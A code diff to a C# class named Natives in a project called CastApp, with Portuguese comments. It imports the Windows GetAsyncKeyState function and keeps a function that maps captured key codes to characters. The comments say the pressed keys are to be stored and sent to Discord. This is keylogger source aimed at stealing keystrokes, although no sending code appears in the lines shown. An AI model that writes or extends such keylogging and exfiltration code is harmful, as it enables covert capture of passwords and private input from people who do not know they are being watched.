@@ -4,16 +4,24 @@ namespace CastApp
 {
     public class Natives
     {
-        // Importacao da Api do Windows user32.dll importamos uma funcao chamada GetAsyncKeyState() basicamente ela retorna o valor Decimal de uma Tecla 
-        // tem o site da microsoft que nos da os codigos hex das teclas apenas temos que converter o Hex para decimal 
-
-        // Site Microsoft: https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
-        // Site para converter: https://www.rapidtables.com/convert/number/hex-to-decimal.html
+        /// <summary>
+        /// <param name="i"></param>
+        /// <returns></returns>
+        /// Importacao da Api do Windows user32.dll importamos uma funcao chamada GetAsyncKeyState() basicamente ela retorna o valor Decimal de uma Tecla 
+        /// tem o site da microsoft que nos da os codigos hex das teclas apenas temos que converter o Hex para decimal 
+        ///
+        /// Site Microsoft: https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
+        /// Site para converter: https://www.rapidtables.com/convert/number/hex-to-decimal.html
+        /// <summary>
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        // Criei esta funcao para ser usada no futuro quando pegarmos a tecla precionada verificamos a que tecla corresponde e depois 
-        // apenas temos que guardar em um arquivo ou variavel para mandar logo para o Discord fica a vosso criterio
+
+        #region TeclaPrecionada Nao sera mais usado por agr mas fica aqui para o futuro
+        /// <summary>
+        /// Criei esta funcao para ser usada no futuro quando pegarmos a tecla precionada verificamos a que tecla corresponde e depois 
+        /// apenas temos que guardar em um arquivo ou variavel para mandar logo para o Discord fica a vosso criterio
+        /// </summary>
         public static string TeclaPrecionada(int intcode)
         {
             string teclaPrecionada = string.Empty;
@@ -135,5 +143,6 @@ namespace CastApp
 
             return teclaPrecionada;
         }
+        #endregion
     }
 }
